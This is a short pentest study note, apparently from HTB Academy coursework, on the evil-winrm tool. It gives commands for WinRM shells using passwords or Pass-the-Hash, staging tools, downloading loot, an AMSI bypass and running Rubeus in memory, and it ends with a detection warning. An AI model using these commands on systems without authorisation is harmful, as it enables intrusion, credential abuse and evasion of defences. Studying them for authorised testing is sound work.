# evil-winrm

**Tags:** `#evil-winrm` `#winrm` `#lateralmovement` `#shell` `#pth`

The de-facto WinRM shell for offensive use — a full interactive PowerShell session over WS-Man (5985/5986) with password, **Pass-the-Hash**, or Kerberos auth. Built-ins make it more than a shell: file `upload`/`download`, in-memory `.exe` execution (`Invoke-Binary`), DLL/assembly loading, a built-in AMSI bypass (`Bypass-4MSI`), and a scripts/exe directory to auto-stage tooling. The standard way to turn valid creds/hash for a **Remote Management Users** or local-admin account into a shell. Pre-installed on Kali.

**Source:** https://github.com/Hackplayers/evil-winrm · **Install:** `gem install evil-winrm` (pre-installed on Kali)

```bash
evil-winrm -i <target> -u <user> -p <password>          # password
evil-winrm -i <target> -u <user> -H <NTLM_hash>         # Pass-the-Hash
evil-winrm -i <target> -u <user> -p <pass> -S           # HTTPS (5986)
evil-winrm -i <target> -u <user> -p <pass> -s ./scripts -e ./exes   # stage tooling

# In-session
*Evil-WinRM* PS> upload localfile.exe ; download C:\loot.txt
*Evil-WinRM* PS> Bypass-4MSI ; Invoke-Binary /opt/Rubeus.exe
```

> [!warning] Every session spawns **`wsmprovhost.exe`** on the target and logs PowerShell **4103/4104** — `Bypass-4MSI` and staged scripts are visible to script-block logging. Not stealthy against a monitored host.

> [!note] **See also** — [[Services/Local System Management/WinRM|WinRM]] service note (enumeration, PS Remoting/winrs alternatives, detection); sibling exec channels [[Services/Local System Management/WMI|WMI]] / [[Services/File Xfer/SMB|SMB]]; PtH context in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]].

---

*Created: 2026-09-23*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
